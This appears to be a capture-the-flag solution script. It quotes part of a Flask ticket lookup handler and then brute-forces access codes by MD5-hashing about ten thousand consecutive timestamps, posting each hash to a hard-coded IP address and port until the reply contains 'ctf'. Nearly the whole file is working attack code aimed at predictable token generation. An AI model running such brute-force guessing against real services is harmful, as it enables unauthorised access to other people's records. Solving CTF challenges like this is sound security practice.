import requests
import hashlib
# initial_time = 1628168161, md5 hash from d63af914bd1b6210c358e145d61a8abc
r = requests.post('http://35.198.79.69:32709/', {
    'code': 'd63af914bd1b6210c358e145d61a8abc',
})
print(r.text)
"""
@app.route('/', methods=['GET', 'POST', 'PUT'])

def index():

    if request.method == 'POST':

        code = request.form['code']

        if len(code) < 0:

            return "You should provide the code!"

        with sqlite3.connect("database.db") as con:

            cur = con.cursor()

            rows = cur.execute("SELECT name, content FROM tickets WHERE code = ?", (code,)).fetchall()
"""
# we have to find the code that is in the database
# the code is the md5 hash of a timestamp, we have to find the timestamp, hash it and send it to the server, we will brute force the timestamp and hash it
for i in range(1628168161, 1628168161+10000):
    code = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.post('http://35.198.79.69:32709/', {
        'code': str(code),
    })
    if 'ctf' in r.text:
        print(r.text)